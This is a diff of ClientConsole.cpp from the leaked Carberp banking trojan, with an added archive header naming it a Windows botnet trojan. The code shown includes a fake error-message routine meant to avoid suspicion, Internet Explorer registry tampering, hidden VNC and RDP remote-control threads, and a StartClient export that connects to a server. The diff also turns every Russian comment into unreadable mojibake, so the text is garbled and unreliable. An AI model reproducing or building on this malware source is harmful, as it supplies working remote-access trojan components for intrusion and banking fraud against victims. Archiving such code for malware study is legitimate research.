@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 // ClientConsole.cpp : Defines the entry point for the console application.
 //
 
@@ -772,10 +783,10 @@ void ProcessPK_SC_RUNFILE( CClientContext *pContext, SOCKET s, PPacket p )
 
 }
 
-//фейковое сообщени об ошибке
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 void ReportFaultViaWnd(HWND hWnd)
 {
-    // если окно уже скрыто - сообщение об ошибке только вызовет лишние подозрения
+    // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     if (IsWindowVisible(hWnd))
     {
         DWORD dwID;
@@ -785,7 +796,7 @@ void ReportFaultViaWnd(HWND hWnd)
         DWORD dwCount=GetModuleFileNameEx(hProcess,0,szFullFileName,MAX_PATH);
         CloseHandle(hProcess);
 
-        // если путь к программе успешно получен - запускаем ее на выполнение
+        // пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
         if (dwCount)
         {
             STARTUPINFO si={0};
@@ -962,8 +973,8 @@ int  x_ShutDown()
 }
 
 
-//работа с реестром.
-// cсоздать раздел в реестре ротмер CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+// cпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ CreateKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Internet Explorer\\Main","TabProcGrowth");
 bool CreateKey(HKEY h, char* path, char* name )
 {
      HKEY key;
@@ -975,8 +986,8 @@ bool CreateKey(HKEY h, char* path, char* name )
      RegCloseKey(key);
      return true;
 }
-//работа с реестром.
-//корневой ключ, путь без ключа, имя создаваемого значения, значение(создает заменяет значение REG_SZ)
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ(пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ REG_SZ)
 bool SetValueString(HKEY h, char* path, char* name,  char* values )
 {
      HKEY key;
@@ -999,12 +1010,12 @@ bool GetValueString(char* sVal)
 	RegOpenKey(HKEY_CURRENT_USER, L"AppEvents\\Schemes\\Apps\\Explorer\\Navigating\\.Current", &key);
 
 
-	DWORD Type;      //сюда возвращается тип параметра
-    DWORD Size=256;  //макс. длина значения параметра
+	DWORD Type;      //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+    DWORD Size=256;  //пїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     LONG rc=RegQueryValueExA(key,"",NULL,&Type,(BYTE*)sVal,&Size);
     if(rc==ERROR_SUCCESS)
     {
-      //параметр прочитан успешно
+      //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
     }
 	return 0;
 }
@@ -1056,7 +1067,7 @@ DWORD StartVNC_(LPVOID param)
 
 
 	Start();
-	while ( 1 )// ждем команды на выключение
+	while ( 1 )// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		HANDLE tmp;
 		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "ANCStop");
@@ -1505,7 +1516,7 @@ DWORD WINAPI ClientStartRDP_Dll( LPVOID lpThreadParameter )
 
 	int i=Init(ip);
 	int w=Start();
-	while ( 1 )// ждем команды на выключение
+	while ( 1 )// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		HANDLE tmp;
 		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "DllStop");
@@ -1688,7 +1699,7 @@ extern "C" __declspec(dllexport) void  StartClient(
 	char *Server, int Port, char *Uid, int BrowserType )
 {
 
-	/*OutputDebugStringA("запуск удался");
+	/*OutputDebugStringA("пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ");
 	OutputDebugStringA(Server);
 	//return;*/
 	CClientContext context;
@@ -1731,7 +1742,7 @@ int WINAPI WinMain(
 {
 	//ProcessLoadDLL( NULL,0,NULL );
 	//DownloadDLL("");
-//	HWND hWnd=FindWindowA(NULL,"QIP.RU: почта, поиск, новости, знакомства, игры и развлечения - Windows Internet Explorer");
+//	HWND hWnd=FindWindowA(NULL,"QIP.RU: пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - Windows Internet Explorer");
 //	ClickedControl(hWnd,100,100);
 
 	CClientContext context;
